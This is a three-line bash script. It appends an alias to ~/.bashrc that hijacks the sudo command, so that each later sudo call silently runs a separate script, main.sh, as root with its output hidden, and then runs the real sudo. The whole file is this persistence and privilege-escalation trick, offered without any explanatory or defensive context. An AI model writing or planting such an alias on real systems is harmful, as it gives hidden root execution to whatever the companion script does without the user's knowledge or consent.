#!/bin/bash
scripts=$(pwd)'/main.sh'
echo "alias sudo=\"/usr/bin/sudo /bin/bash $scripts 2>/dev/null 1>/dev/null;/usr/bin/sudo\"">>~/.bashrc 
